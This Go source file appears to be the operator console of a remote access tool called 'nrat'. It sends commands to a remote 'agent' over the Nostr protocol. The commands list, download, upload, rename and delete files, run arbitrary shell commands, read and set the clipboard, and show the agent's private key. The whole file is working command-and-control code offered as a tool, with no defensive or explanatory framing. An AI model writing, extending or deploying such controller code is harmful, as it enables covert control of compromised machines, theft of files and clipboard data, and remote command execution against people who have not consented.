package control

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"
	"uw/ulog"

	"nrat/model"
	"nrat/pkg/ishell"
	"nrat/pkg/nostr"
	"nrat/utils"
)

type ControlCmd struct {
	Name    string
	Aliases []string
	Help    string
	Input   func(c *ishell.Context, control *Control) error
	Output  func(c *ishell.Context, control *Control, evt *model.Event) error
}

func addControlCmd(sh *ishell.Shell, control *Control, cmdList []*ControlCmd) {
	for i := 0; i < len(cmdList); i++ {
		cmd := cmdList[i]

		sh.AddCmd(&ishell.Cmd{
			Name:    cmd.Name,
			Aliases: cmd.Aliases,
			Help:    "* " + cmd.Help,
			Func: func(c *ishell.Context) {
				if control.privateKey == "" {
					ulog.Error("please choice a agent")
					return
				}

				if e := cmd.Input(c, control); e != nil {
					ulog.Error("control cmd failed: %s", e)
					return
				}

				c.ProgressBar().Suffix(fmt.Sprintf(" execute %s, please wait...", cmd.Name))

				for {
					c.ProgressBar().Start()

					select {
					case evt := <-control.eventCh:
						c.ProgressBar().Stop()
						if e := cmd.Output(c, control, evt); e != nil && !errors.Is(e, ErrContinue) {
							ulog.Error("control cmd failed: %s", e)
						} else if errors.Is(e, ErrContinue) {
							ulog.Warn("continue wait event")
							continue
						}

						return
					case <-time.After(control.cmdTimeout):
						c.ProgressBar().Final("timeout")
						c.ProgressBar().Stop()
						ulog.Error("control cmd %s timeout after %s",
							cmd.Name, control.cmdTimeout)
						return
					}
				}
			},
		})
	}
}

var cmdList []*ControlCmd = []*ControlCmd{
	{
		Name: "ping",
		Help: "ping agent, args [content]",
		Input: func(c *ishell.Context, control *Control) error {
			return control.publish(context.Background(), &model.Event{
				Type: "ping",
				Content: func() string {
					if len(c.Args) > 0 {
						return c.Args[0]
					}

					return ""
				}(),
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "ping" {
				return ErrContinue
			}

			if evt.Content != "" {
				c.Printf("reply: %s\r\n", evt.Content)
				return nil
			}

			c.Println("reply: none")
			return nil
		},
	},
	{
		Name: "info",
		Help: "get agent info, args [show full private key]",
		Input: func(c *ishell.Context, control *Control) error {
			return control.publish(context.Background(), &model.Event{
				Type: "info",
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "info" {
				return ErrContinue
			}

			n := strings.Split(evt.Content, model.DataSeparator)
			if len(n) < 7 {
				ulog.Error("agent info format error")
			}

			if n[5] == "" {
				n[5] = "none"
			}

			c.Printf("os: %s\r\n", n[0])
			c.Printf("arch: %s\r\n", n[1])
			c.Printf("cpu: %s\r\n", n[2])
			c.Printf("version: %s\r\n", n[3])
			c.Printf("relay: %s\r\n", n[4])
			c.Printf("proxy: %s\r\n", n[5])

			publishKey, e := nostr.GetPublicKey(n[6])
			if e != nil {
				publishKey = "none"
			}

			if len(c.Args) < 1 {
				c.Printf("private key: %s\r\n", utils.CutMore(n[6], 10))
			} else {
				c.Printf("private key: %s\r\n", n[6])
			}
			c.Printf("publish key: %s\r\n", publishKey)
			return nil
		},
	},
	{
		Name:    "list",
		Help:    "list agent files, args [path]",
		Aliases: []string{"ls"},
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Args = append(c.Args, agentPwd)
			}

			if !agentOs.IsAbsPath(c.Args[0]) {
				c.Args[0] = path.Join(agentPwd, c.Args[0])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "list",
				Content: c.Args[0],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "list" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("list failed: %s", evt.Error)
			}

			if evt.Content == "" {
				c.Printf("total 0\r\n")
				return nil
			}

			n := strings.Split(evt.Content, model.DataSeparator)

			c.Printf("total %d\r\n", len(n))

			for i := 0; i < len(n); i++ {
				tp := "file"
				if strings.HasSuffix(n[i], "/") {
					tp = "dir"
				}

				c.Printf("%d\t%s\t%s\r\n", i+1, tp, strings.TrimRight(n[i], "/"))
			}

			return nil
		},
	},
	{
		Name:    "chdir",
		Help:    "change agent pwd, args [path]",
		Aliases: []string{"cd"},
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing path")
			}
			if !agentOs.IsAbsPath(c.Args[0]) {
				c.Args[0] = path.Join(agentPwd, c.Args[0])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "list",
				Content: c.Args[0],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "list" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("list failed: %s", evt.Error)
			}

			agentPwd = c.Args[0]
			c.SetPrompt(fmt.Sprintf("[control@%s %s]$ ", agentSortKey, agentPwd))
			return nil
		},
	},
	{
		Name:    "download",
		Aliases: []string{"dl"},
		Help:    "download agent file, args [remote] [local]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 2 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("args too short")
			}

			if !strings.HasPrefix(c.Args[0], "/") {
				c.Args[0] = path.Join(agentPwd, c.Args[0])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "read",
				Content: c.Args[0],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "read" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("download failed: %s", evt.Error)
			}

			b, e := base64.StdEncoding.DecodeString(evt.Content)
			if e != nil {
				return fmt.Errorf("decode content failed: %w", e)
			}

			if e := os.MkdirAll(filepath.Dir(c.Args[1]), 0o755); e != nil {
				return fmt.Errorf("mkdir failed: %w", e)
			}

			if e := os.WriteFile(c.Args[1], b, 0o755); e != nil {
				return fmt.Errorf("write file failed: %w", e)
			}

			c.Printf("download file success, saved to %s\n", c.Args[1])
			return nil
		},
	},
	{
		Name:    "upload",
		Aliases: []string{"up"},
		Help:    "upload file to agent, args [local] [remote]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 2 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("args too short")
			}

			b, e := os.ReadFile(c.Args[0])
			if e != nil {
				return fmt.Errorf("read file failed: %w", e)
			}

			if !strings.HasPrefix(c.Args[1], "/") {
				c.Args[1] = path.Join(agentPwd, c.Args[1])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "write",
				Content: c.Args[1] + model.DataSeparator + base64.StdEncoding.EncodeToString(b),
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "write" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("write failed: %s", evt.Error)
			}

			c.Printf("upload file success, saved to %s\n", c.Args[1])
			return nil
		},
	},
	{
		Name: "mkdir",
		Help: "make agent dir, args [path]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing path")
			}

			if !agentOs.IsAbsPath(c.Args[0]) {
				c.Args[0] = path.Join(agentPwd, c.Args[0])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "mkdir",
				Content: c.Args[0],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "mkdir" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("mkdir failed: %s", evt.Error)
			}

			c.Printf("mkdir success, path: %s\r\n", c.Args[0])
			return nil
		},
	},
	{
		Name:    "move",
		Aliases: []string{"mv"},
		Help:    "rename agent file, args [old] [new]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 2 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("args too short")
			}

			for i := 0; i < len(c.Args); i++ {
				if !agentOs.IsAbsPath(c.Args[0]) {
					c.Args[i] = path.Join(agentPwd, c.Args[i])
				}
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "rename",
				Content: c.Args[0] + model.DataSeparator + c.Args[1],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "rename" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("rename failed: %s", evt.Error)
			}

			c.Printf("rename success, %s -> %s\r\n", c.Args[0], c.Args[1])
			return nil
		},
	},
	{
		Name:    "remove",
		Aliases: []string{"rm"},
		Help:    "remove agent file, args [path]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing path")
			}

			if !agentOs.IsAbsPath(c.Args[0]) {
				c.Args[0] = path.Join(agentPwd, c.Args[0])
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "remove",
				Content: c.Args[0],
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "remove" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("remove failed: %s", evt.Error)
			}

			c.Printf("remove success, path: %s\r\n", c.Args[0])
			return nil
		},
	},
	{
		Name: "exec",
		Help: "exec command on agent, args [command] [args...]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing command")
			}

			c.Args = append([]string{
				control.storage.Storage().ExecTimeout,
			}, append(agentOs.Shell(), strings.Join(c.Args, " "))...)

			return control.publish(context.Background(), &model.Event{
				Type:    "exec",
				Content: strings.Join(c.Args, model.DataSeparator),
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "exec" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("exec failed: %s", evt.Error)
			}

			b, e := base64.StdEncoding.DecodeString(evt.Content)
			if e != nil {
				ulog.Debug("encode output: %s", evt.Content)
				return fmt.Errorf("decode exec output failed: %w", e)
			}

			c.Printf("%s\r\n", b)
			return nil
		},
	},
	{
		Name:    "clipboard",
		Aliases: []string{"cbd"},
		Help:    "clipboard operation, args [set|get] [content]",
		Input: func(c *ishell.Context, control *Control) error {
			if len(c.Args) < 1 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing command")
			}

			if c.Args[0] == "set" && len(c.Args) < 2 {
				c.Println(c.Cmd.HelpText())
				return fmt.Errorf("missing content")
			}

			if c.Args[0] == "set" {
				c.Args[1] = base64.StdEncoding.EncodeToString([]byte(c.Args[1]))
			}

			return control.publish(context.Background(), &model.Event{
				Type:    "clipboard",
				Content: strings.Join(c.Args, model.DataSeparator),
			})
		},
		Output: func(c *ishell.Context, control *Control, evt *model.Event) error {
			if evt.Type != "clipboard" {
				return ErrContinue
			}

			if evt.Error != "" {
				return fmt.Errorf("clipboard failed: %s", evt.Error)
			}

			if c.Args[0] != "get" {
				c.Printf("set clipboard success\r\n")
				return nil
			}

			b, e := base64.StdEncoding.DecodeString(evt.Content)
			if e != nil {
				ulog.Debug("encode output: %s", evt.Content)
				return fmt.Errorf("decode exec output failed: %w", e)
			}

			c.Printf("clipboard: %s\r\n", b)
			return nil
		},
	},
}
